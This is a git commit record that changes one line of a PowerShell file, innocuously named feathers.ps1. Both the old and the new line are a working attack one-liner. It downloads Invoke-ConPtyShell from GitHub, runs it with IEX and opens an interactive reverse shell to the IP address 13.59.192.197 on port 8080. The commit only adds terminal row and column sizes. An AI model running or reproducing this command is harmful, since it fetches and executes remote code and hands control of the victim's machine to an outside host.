665c4f9041f58a36f5e89770726c85ceb084f92a
Hogartbonovue <62154694+Hogartbonovue@users.noreply.github.com>
2020-03-13 18:07:28 -0400

    Update feathers.ps1

--- feathers.ps1
+++ feathers.ps1
@@ -1,1 +1,1 @@
-IEX(IWR https://raw.githubusercontent.com/antonioCoco/ConPtyShell/master/Invoke-ConPtyShell.ps1 -UseBasicParsing); Invoke-ConPtyShell 13.59.192.197 8080
+IEX(IWR https://raw.githubusercontent.com/antonioCoco/ConPtyShell/master/Invoke-ConPtyShell.ps1 -UseBasicParsing); Invoke-ConPtyShell 13.59.192.197 8080 -Rows 30 -Cols 90
